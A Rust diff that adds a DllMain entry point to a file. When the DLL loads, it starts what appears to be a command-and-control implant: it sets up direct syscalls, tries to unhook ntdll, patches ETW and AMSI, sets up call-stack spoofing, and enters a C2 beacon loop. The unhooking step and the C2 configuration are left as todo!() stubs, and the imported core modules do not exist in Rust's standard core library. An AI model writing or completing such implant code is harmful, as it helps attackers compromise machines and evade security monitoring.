@@ -10,3 +10,47 @@ macro_rules! debug {
         println!("[DEBUG] {}", format_args!($($arg)*));
     };
 }
+
+#[unsafe(no_mangle)]
+pub unsafe extern "system" fn DllMain(_instance: *mut ::core::ffi::c_void, reason: u32, _reserved: *mut ::core::ffi::c_void) -> i32 {
+    if reason == 1 { // DLL_PROCESS_ATTACH
+        beacon_entry();
+    }
+    1 // TRUE
+}
+
+unsafe fn beacon_entry() {
+    use core::net::beacon;
+    use core::{ssn_table, etw, amsi, spoof};
+    if !ssn_table::initialize_syscalls(::core::ptr::null_mut()) {
+        return;
+    }
+
+    let unhook_result: Option<usize> = todo!("Unhook ntdll");
+    if let Some(n) = unhook_result {
+        if n == 0 {
+            debug!("[*] [UNHOOK] ntdll clean, no hooks found");
+        } else {
+            debug!("[*] [UNHOOK] Restored {} hokked bytes in ntdll", n);
+            ssn_table::initialize_syscalls(::core::ptr::null_mut());
+        }
+    } else {
+        debug!("[*] [UNHOOK] Failed, continuing with potentially hooked ntdll");
+    }
+
+    etw::patch_etw();
+    amsi::patch_amsi();
+    spoof::initialize_spoof_gadgets();
+
+    if !ssn_table::initialize_network() {
+        return;
+    }
+    // TODO: Decrypt C2 secret and start beacon
+    let c2_config: beacon::C2Config = todo!("Fill the config");
+    beacon::beacon_loop(&c2_config);
+
+    unimplemented!()
+}
+
+extern crate alloc;
+use alloc::vec::Vec;
